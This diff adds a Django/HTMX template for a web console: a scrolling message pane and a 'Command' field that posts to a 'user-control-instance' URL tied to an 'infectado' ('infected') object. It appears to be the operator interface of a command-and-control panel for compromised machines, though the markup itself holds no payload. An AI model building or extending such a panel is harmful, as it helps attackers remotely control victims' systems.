@@ -1,0 +1,16 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<div class="container mt-4">
+    <div id="messages" class="border rounded-4 mb-2 p-4" style="height: 500px; overflow-y:scroll; background-color: #505050; color:limegreen;">
+        
+    </div>
+    <form hx-post="{% url 'web:user-control-instance' infectado.uuid %}" hx-target="#messages" hx-swap="beforeend" hx-on::after-request="if(event.detail.successful) this.reset()">
+        {% csrf_token  %}
+        <div class="input-group mb-3">
+            <input name="command" type="text" class="form-control" placeholder="Command">
+            <button class="btn btn-outline-secondary" type="submit" id="button-send">Send</button>
+        </div>
+    </form>
+</div>
+{% endblock %}
